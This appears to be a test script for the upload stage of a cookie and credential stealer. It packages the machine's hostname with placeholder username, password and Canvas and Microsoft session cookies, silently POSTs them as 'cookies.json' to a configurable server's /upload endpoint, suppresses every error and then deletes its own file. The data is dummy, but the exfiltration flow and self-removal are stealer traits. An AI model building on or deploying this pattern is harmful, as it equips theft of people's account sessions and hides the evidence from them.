#!/usr/bin/env python3
import json
import os
import platform
import sys
import urllib.request
from datetime import datetime

def main():
    # Get server URL
    server_url = 'http://localhost:8000'
    if '--server' in sys.argv:
        try:
            idx = sys.argv.index('--server')
            server_url = sys.argv[idx + 1]
        except:
            pass
    
    # Create JSON data
    data = {
        "execution_info": {
            "script_name": "test_json.py",
            "execution_time": datetime.now().isoformat(),
            "hostname": platform.node()[:20]
        },
        "sensitive_data": {
            "username": "User123", 
            "password": "secure_password",
            "cookies": {
                "canvas": "canvas_cookie",
                "microsoft": "microsoft_cookie",
                "your_mom": "your_moms_cookie"
            }
        }
    }
    
    # Send to server
    try:
        upload_data = {
            "filename": "cookies.json",
            "json_data": data
        }
        
        req = urllib.request.Request(
            f"{server_url}/upload",
            data=json.dumps(upload_data).encode('utf-8'),
            headers={'Content-Type': 'application/json'}
        )
        
        urllib.request.urlopen(req, timeout=5)
    except:
        pass
    
    # Clean up
    os.remove(__file__)

if __name__ == "__main__":
    main()